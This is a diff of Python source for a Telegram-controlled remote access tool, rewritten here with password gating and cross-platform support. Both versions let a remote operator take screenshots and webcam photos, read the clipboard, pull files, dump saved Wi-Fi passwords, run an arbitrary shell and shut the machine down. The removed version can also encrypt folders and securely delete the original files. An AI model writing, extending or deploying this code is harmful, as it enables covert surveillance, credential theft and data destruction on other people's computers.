@@ -4,400 +4,397 @@ import mss
 import cv2
 import time
 import shutil
-import pyttsx3
 import telebot
 import platform
-import clipboard
 import subprocess
 import pyAesCrypt
-import xml.etree.ElementTree as ET
-from secure_delete import secure_delete
+import threading
+import requests
+import pyperclip
+from gtts import gTTS
+from io import BytesIO
+from pathlib import Path
+from functools import wraps
+from tempfile import NamedTemporaryFile
 
-TOKEN = 'YOUR-TOKEN'
+# ==============================
+# CONFIGURATION
+# ==============================
+
+TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
+BOT_PASSWORD = "PUT_YOUR_PASSWORD_HERE"
 
 bot = telebot.TeleBot(TOKEN)
-cd = os.path.expanduser("~")
-secure_delete.secure_random_seed_init()
-bot.set_webhook()
+OS = platform.system()  # 'Windows', 'Linux', 'Darwin'
+cd = Path.home()
 
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(message.chat.id, 'Welcome! Send \n /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  ')
-
-@bot.message_handler(commands=['screen'])
-def send_screen(message):
-    file_name = "capture.png"
-    image_path = os.path.join(cd, file_name)
-
-    with mss.mss() as sct:
-        sct.shot(output=image_path)
-                              
-    # image_path = f"{cd}\capture.png"
-    print(image_path)
-    with open(image_path, "rb") as photo:
-        bot.send_photo(message.chat.id, photo)
-   
-
-@bot.message_handler(commands=['ip'])
-def send_ip_info(message):
-    try:
-        command_ip = "curl ipinfo.io/ip"
-        result = subprocess.check_output(command_ip, shell=True)
-        public_ip = result.decode("utf-8").strip()
-        bot.send_message(message.chat.id, public_ip)
-    except:
-        bot.send_message(message.chat.id, 'error')
-
-@bot.message_handler(commands=['sys'])
-def send_system_info(message):
-    system_info = {
-        'Platform': platform.platform(),
-        'System': platform.system(),
-        'Node Name': platform.node(),
-        'Release': platform.release(),
-        'Version': platform.version(),
-        'Machine': platform.machine(),
-        'Processor': platform.processor(),
-        'CPU Cores': os.cpu_count(),
-        'Username': os.getlogin(),
-    }
-    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
-    bot.send_message(message.chat.id, system_info_text)
-
-
-@bot.message_handler(commands=['ls'])
-def list_directory(message):
-    try:
-        contents = os.listdir(cd)
-        if not contents:
-            bot.send_message(message.chat.id, "folder is empty.")
-        else:
-            response = "Directory content :\n"
-            for item in contents:
-                response += f"- {item}\n"
-            bot.send_message(message.chat.id, response)
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['cd'])
-def change_directory(message):
-    try:
-        global cd 
-        args = message.text.split(' ')
-        if len(args) >= 2:
-            new_directory = args[1]
-            new_path = os.path.join(cd, new_directory)
-            if os.path.exists(new_path) and os.path.isdir(new_path):
-                cd = new_path
-                bot.send_message(message.chat.id, f"you are in : {cd}")
-            else:
-                bot.send_message(message.chat.id, f"The directory does not exist.")
-        else:
-            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['upload'])
-def handle_upload_command(message):
-    try:
-        args = message.text.split(' ')
-        if len(args) >= 2:
-            file_path = args[1]
-
-            if os.path.exists(file_path):
-           
-                with open(file_path, 'rb') as file:
-                  
-                    bot.send_document(message.chat.id, file)
-
-                bot.send_message(message.chat.id, f"File has been transferred successfully.")
-            else:
-                bot.send_message(message.chat.id, "The specified path does not exist.")
-        else:
-            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['crypt'])
-def encrypt_folder(message):
-    try:
-
-        if len(message.text.split()) >= 2:
-            folder_to_encrypt = message.text.split()[1]
-            password = "Your_fucking_strong_password"
-
-            for root, dirs, files in os.walk(folder_to_encrypt):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    encrypted_file_path = file_path + '.crypt'
-                  
-                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
-                   
-                    if not file_path.endswith('.crypt'):
-                       
-                        secure_delete.secure_delete(file_path)
-            
-            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
-        else:
-            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['decrypt'])
-def decrypt_folder(message):
-    try:
-       
-        if len(message.text.split()) >= 2:
-            folder_to_decrypt = message.text.split()[1]
-            password = "Your_fucking_strong_password"
-      
-            for root, dirs, files in os.walk(folder_to_decrypt):
-                for file in files:
-                    if file.endswith('.crypt'):
-                        file_path = os.path.join(root, file)
-                        decrypted_file_path = file_path[:-6] 
-                       
-                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
-                        
-                        secure_delete.secure_delete(file_path)
-            
-            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
-        else:
-            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['lock'])
-def lock_command(message):
-    try:
-
-        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        if result.returncode == 0:
-            bot.send_message(message.chat.id, "windows session succefuly locked.")
-        else:
-            bot.send_message(message.chat.id, "Impossible to lock windows session.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-shutdown_commands = [
-    ['shutdown', '/s', '/t', '5'],
-    ['shutdown', '-s', '-t', '5'],
-    ['shutdown.exe', '/s', '/t', '5'],
-    ['shutdown.exe', '-s', '-t', '5'],
-]
-
-@bot.message_handler(commands=['shutdown'])
-def shutdown_command(message):
-    try:
-        success = False
-        for cmd in shutdown_commands:
-            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            if result.returncode == 0:
-                success = True
-                break
-        
-        if success:
-            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
-        else:
-            bot.send_message(message.chat.id, "Impossible to shutdown.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-@bot.message_handler(commands=['webcam'])
-def capture_webcam_image(message):
-    try:
-        
-        cap = cv2.VideoCapture(0)
-
-    
-        if not cap.isOpened():
-            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
-        else:
-            
-            ret, frame = cap.read()
-
-            if ret:
-                
-                cv2.imwrite("webcam.jpg", frame)
-
-              
-                with open("webcam.jpg", 'rb') as photo_file:
-                    bot.send_photo(message.chat.id, photo=photo_file)
-                
-                os.remove("webcam.jpg")  
-            else:
-                bot.send_message(message.chat.id, "Error while capturing the image.")
-
-        cap.release()
-
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
-
-
-@bot.message_handler(commands=['speech'])
-def text_to_speech_command(message):
-    try:
-       
-        text = message.text.replace('/speech', '').strip()
-        
-        if text:
-           
-            pyttsx3.speak(text)
-            bot.send_message(message.chat.id, "succesful say.")
-        else:
-            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
-@bot.message_handler(commands=['clipboard'])
-def clipboard_command(message):
-    try:
-      
-        clipboard_text = clipboard.paste()
-
-        if clipboard_text:
-          
-            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
-        else:
-            bot.send_message(message.chat.id, "clipboard is empty.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
-
+authenticated_users = set()
 user_states = {}
-
 
 STATE_NORMAL = 1
 STATE_SHELL = 2
 
-@bot.message_handler(commands=['shell'])
-def start_shell(message):
-    user_id = message.from_user.id
-    user_states[user_id] = STATE_SHELL
-    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")
+# ==============================
+# HELPERS
+# ==============================
 
-@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
-def handle_shell_commands(message):
-    user_id = message.from_user.id
-    command = message.text.strip()
-
-    if command.lower() == 'exit':
-        bot.send_message(user_id, "Exiting remote shell interface.")
-        user_states[user_id] = STATE_NORMAL
-    else:
-        try:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-
-            if stdout:
-                output = stdout.decode('utf-8', errors='ignore')
-                bot.send_message(user_id, f"Command output:\n{output}")
-            if stderr:
-                error_output = stderr.decode('utf-8', errors='ignore')
-                bot.send_message(user_id, f"Command error output:\n{error_output}")
-        except Exception as e:
-            bot.send_message(user_id, f"An error occurred: {str(e)}")
-
-def get_user_state(user_id):
-    return user_states.get(user_id, STATE_NORMAL)
-
-@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
-def handle_shell_commands(message):
-    user_id = message.from_user.id
-    command = message.text.strip()
-
-    if command.lower() == 'exit':
-        bot.send_message(user_id, "Exiting remote shell interface.")
-        user_states[user_id] = STATE_NORMAL
-    else:
-        try:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-
-            if stdout:
-                output = stdout.decode('utf-8', errors='ignore')
-                send_long_message(user_id, f"Command output:\n{output}")
-            if stderr:
-                error_output = stderr.decode('utf-8', errors='ignore')
-                send_long_message(user_id, f"Command error output:\n{error_output}")
-        except Exception as e:
-            bot.send_message(user_id, f"An error occurred: {str(e)}")
+def is_authenticated(user_id):
+    return user_id in authenticated_users
 
 
-def send_long_message(user_id, message_text):
-    part_size = 4000  
-    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
-
-    for part in message_parts:
-        bot.send_message(user_id, part)
-
-
-@bot.message_handler(commands=['wifi'])
-def get_wifi_passwords(message):
-    try:
-        export_folder = os.path.join(cd, "wifi_profiles")
-        os.makedirs(export_folder, exist_ok=True)  # Create folder if not exists
-        
-        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear', f'folder={export_folder}'], shell=True, text=True)
-
-        # list all xml files in the folder
-        files = [f for f in os.listdir(export_folder) if f.endswith('.xml')]
-
-        if not files:
-            bot.send_message(message.chat.id, "No Wi-Fi profiles found.")
+def authenticate_required(func):
+    @wraps(func)
+    def wrapper(message, *args, **kwargs):
+        if not is_authenticated(message.from_user.id):
+            bot.send_message(message.chat.id, "Please authenticate with /auth [password]")
             return
-        
-        all_profiles = ""
-        # loop through all profile XML files
-        for profile_file in files:
-            profile_path = os.path.join(export_folder, profile_file)
+        return func(message, *args, **kwargs)
+    return wrapper
 
-            try:
-                with open(profile_path, 'r', encoding='utf-8') as file:
-                    xml_content = file.read()
 
-                # parse the XML content
-                ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
-                password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
+def send_long_message(chat_id, text):
+    chunk_size = 4000
+    for i in range(0, len(text), chunk_size):
+        bot.send_message(chat_id, text[i:i + chunk_size])
 
-                if ssid_match:
-                    ssid = ssid_match.group(1)
-                    password = password_match.group(1) if password_match else "(No Password Found)"
-                    all_profiles += f"SSID: {ssid}\nPASS: {password}\n\n"
 
-               
-            except Exception as e:
-                bot.send_message(message.chat.id, f"error processing file : {profile_file} : {e}")
+def secure_delete_fallback(path: Path, passes=2):
+    try:
+        if not path.exists() or not path.is_file():
+            return False
+        length = path.stat().st_size
+        with open(path, "r+b") as f:
+            for _ in range(passes):
+                f.seek(0)
+                f.write(os.urandom(length))
+                f.flush()
+                os.fsync(f.fileno())
+        path.unlink()
+        return True
+    except Exception:
+        try:
+            path.unlink()
+        except:
+            return False
+    return True
 
-        if all_profiles:
-            bot.send_message(message.chat.id, f"Wi-Fi profiles:\n{all_profiles}")
-        else:
-            bot.send_message(message.chat.id, "No Wi-Fi profiles found.")
 
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-    
-    finally:
-        if os.path.exists(export_folder):
+# ==============================
+# SYSTEM FUNCTIONS
+# ==============================
+
+def get_public_ip():
+    try:
+        r = requests.get("https://api.ipify.org")
+        return r.text.strip()
+    except:
+        return "Error retrieving IP."
+
+
+def get_system_info():
+    info = {
+        "OS": platform.system(),
+        "Version": platform.version(),
+        "Release": platform.release(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "CPU cores": os.cpu_count(),
+        "Username": os.getenv("USER") or os.getenv("USERNAME"),
+    }
+    return "\n".join(f"{k}: {v}" for k, v in info.items())
+
+
+def take_screenshot(path: Path):
+    with mss.mss() as sct:
+        sct.shot(output=str(path))
+    return path
+
+
+def capture_webcam_image(path: Path):
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        return None
+    ret, frame = cap.read()
+    cap.release()
+    if ret:
+        cv2.imwrite(str(path), frame)
+        return path
+    return None
+
+
+def lock_screen():
+    try:
+        if OS == "Windows":
+            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
+        elif OS == "Darwin":
+            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession", "-suspend"])
+        elif OS == "Linux":
+            if shutil.which("loginctl"):
+                subprocess.run(["loginctl", "lock-session"])
+            elif shutil.which("gnome-screensaver-command"):
+                subprocess.run(["gnome-screensaver-command", "-l"])
+            else:
+                return False
+        return True
+    except Exception:
+        return False
+
+
+def shutdown_computer():
+    try:
+        if OS == "Windows":
+            subprocess.run(["shutdown", "/s", "/t", "5"])
+        elif OS == "Linux":
+            subprocess.run(["systemctl", "poweroff"])
+        elif OS == "Darwin":
+            subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
+        return True
+    except Exception:
+        return False
+
+
+def get_clipboard_content():
+    try:
+        return pyperclip.paste()
+    except:
+        return None
+
+
+def play_text(text, lang="en"):
+    tts = gTTS(text=text, lang=lang)
+    with NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
+        tts.write_to_fp(tmp)
+        tmp_path = tmp.name
+    if OS == "Windows":
+        subprocess.run(["start", tmp_path], shell=True)
+    elif OS == "Darwin":
+        subprocess.run(["open", tmp_path])
+    else:
+        subprocess.run(["xdg-open", tmp_path])
+
+
+def get_wifi_passwords():
+    profiles = []
+    try:
+        if OS == "Windows":
+            export_folder = Path.home() / "wifi_profiles"
+            export_folder.mkdir(exist_ok=True)
+            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_folder}"], shell=True)
+            for file in export_folder.glob("*.xml"):
+                xml_content = file.read_text(errors="ignore")
+                ssid = re.search(r"<name>(.*?)</name>", xml_content)
+                key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", xml_content)
+                if ssid:
+                    profiles.append(f"SSID: {ssid.group(1)} | PASS: {key.group(1) if key else 'N/A'}")
             shutil.rmtree(export_folder)
+        elif OS == "Darwin":
+            # macOS version
+            result = subprocess.run(["security", "find-generic-password", "-ga", "Wi-Fi"], capture_output=True, text=True)
+            profiles.append(result.stdout)
+        elif OS == "Linux":
+            result = subprocess.run(["nmcli", "-t", "-f", "NAME,SECURITY", "connection", "show"], capture_output=True, text=True)
+            profiles.append(result.stdout)
+    except Exception as e:
+        profiles.append(f"Error: {e}")
+    return "\n".join(profiles) if profiles else "No Wi-Fi profiles found or permission denied."
 
-try:
-    if __name__ == "__main__":
-        print('Waiting for commands...')
+
+# ==============================
+# BOT COMMANDS
+# ==============================
+
+@bot.message_handler(commands=["auth"])
+def authenticate(message):
+    user_id = message.from_user.id
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.send_message(user_id, "Usage: /auth [password]")
+        return
+    if parts[1] == BOT_PASSWORD:
+        authenticated_users.add(user_id)
+        bot.send_message(user_id, "✅ Authenticated successfully.")
+    else:
+        bot.send_message(user_id, "❌ Wrong password.")
+
+
+@bot.message_handler(commands=["start"])
+@authenticate_required
+def start(message):
+    bot.send_message(
+        message.chat.id,
+        "Commands:\n"
+        "/screen - screenshot\n"
+        "/sys - system info\n"
+        "/ip - public IP\n"
+        "/cd [dir] - change folder\n"
+        "/ls - list files\n"
+        "/upload [path] - get file\n"
+        "/clipboard - get clipboard\n"
+        "/speech [text] - play speech\n"
+        "/wifi - get Wi-Fi info\n"
+        "/lock - lock PC\n"
+        "/shutdown - shutdown PC\n"
+        "/shell - open remote shell\n"
+        "/webcam - capture webcam"
+    )
+
+
+@bot.message_handler(commands=["screen"])
+@authenticate_required
+def screenshot_cmd(message):
+    path = cd / "screenshot.png"
+    take_screenshot(path)
+    with open(path, "rb") as f:
+        bot.send_photo(message.chat.id, f)
+    path.unlink(missing_ok=True)
+
+
+@bot.message_handler(commands=["sys"])
+@authenticate_required
+def sys_info_cmd(message):
+    bot.send_message(message.chat.id, get_system_info())
+
+
+@bot.message_handler(commands=["ip"])
+@authenticate_required
+def ip_cmd(message):
+    bot.send_message(message.chat.id, get_public_ip())
+
+
+@bot.message_handler(commands=["ls"])
+@authenticate_required
+def list_dir_cmd(message):
+    try:
+        contents = [p.name for p in cd.iterdir()]
+        bot.send_message(message.chat.id, "\n".join(contents) or "Empty folder.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error: {e}")
+
+
+@bot.message_handler(commands=["cd"])
+@authenticate_required
+def cd_cmd(message):
+    global cd
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        bot.send_message(message.chat.id, f"Current dir: {cd}")
+        return
+    new_path = (cd / args[1]).resolve()
+    if new_path.is_dir():
+        cd = new_path
+        bot.send_message(message.chat.id, f"Changed to: {cd}")
+    else:
+        bot.send_message(message.chat.id, "Folder not found.")
+
+
+@bot.message_handler(commands=["upload"])
+@authenticate_required
+def upload_cmd(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        bot.send_message(message.chat.id, "Usage: /upload [path]")
+        return
+    path = Path(args[1])
+    if path.exists() and path.is_file():
+        with open(path, "rb") as f:
+            bot.send_document(message.chat.id, f)
+    else:
+        bot.send_message(message.chat.id, "File not found.")
+
+
+@bot.message_handler(commands=["clipboard"])
+@authenticate_required
+def clipboard_cmd(message):
+    clip = get_clipboard_content()
+    bot.send_message(message.chat.id, clip or "Clipboard empty or unsupported.")
+
+
+@bot.message_handler(commands=["speech"])
+@authenticate_required
+def speech_cmd(message):
+    text = message.text.replace("/speech", "").strip()
+    if not text:
+        bot.send_message(message.chat.id, "Usage: /speech [text]")
+        return
+    threading.Thread(target=play_text, args=(text,), daemon=True).start()
+    bot.send_message(message.chat.id, "Speaking... 🎤")
+
+
+@bot.message_handler(commands=["lock"])
+@authenticate_required
+def lock_cmd(message):
+    if lock_screen():
+        bot.send_message(message.chat.id, "🔒 Screen locked.")
+    else:
+        bot.send_message(message.chat.id, "❌ Lock not supported on this OS.")
+
+
+@bot.message_handler(commands=["shutdown"])
+@authenticate_required
+def shutdown_cmd(message):
+    if shutdown_computer():
+        bot.send_message(message.chat.id, "💻 Shutting down...")
+    else:
+        bot.send_message(message.chat.id, "❌ Shutdown failed or unsupported.")
+
+
+@bot.message_handler(commands=["webcam"])
+@authenticate_required
+def webcam_cmd(message):
+    img = cd / "webcam.jpg"
+    result = capture_webcam_image(img)
+    if result:
+        with open(result, "rb") as f:
+            bot.send_photo(message.chat.id, f)
+        img.unlink(missing_ok=True)
+    else:
+        bot.send_message(message.chat.id, "Camera not found.")
+
+
+@bot.message_handler(commands=["wifi"])
+@authenticate_required
+def wifi_cmd(message):
+    bot.send_message(message.chat.id, get_wifi_passwords())
+
+
+@bot.message_handler(commands=["shell"])
+@authenticate_required
+def shell_cmd(message):
+    user_states[message.from_user.id] = STATE_SHELL
+    bot.send_message(message.chat.id, "Shell mode active. Type 'exit' to quit.")
+
+
+def get_user_state(uid):
+    return user_states.get(uid, STATE_NORMAL)
+
+
+@bot.message_handler(func=lambda msg: get_user_state(msg.from_user.id) == STATE_SHELL)
+@authenticate_required
+def shell_input(message):
+    uid = message.from_user.id
+    cmd = message.text.strip()
+    if cmd.lower() == "exit":
+        user_states[uid] = STATE_NORMAL
+        bot.send_message(uid, "Exited shell mode.")
+        return
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = proc.communicate(timeout=30)
+        text = (out or b"").decode(errors="ignore") + (err or b"").decode(errors="ignore")
+        send_long_message(uid, text or "[No output]")
+    except Exception as e:
+        bot.send_message(uid, f"Error: {e}")
+
+
+# ==============================
+# MAIN LOOP
+# ==============================
+
+if __name__ == "__main__":
+    print(f"Bot running on {OS} ...")
+    while True:
         try:
             bot.infinity_polling()
-        except:
-            time.sleep(10)
-            pass    
-
-except:
-    time.sleep(5)
-    pass        
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
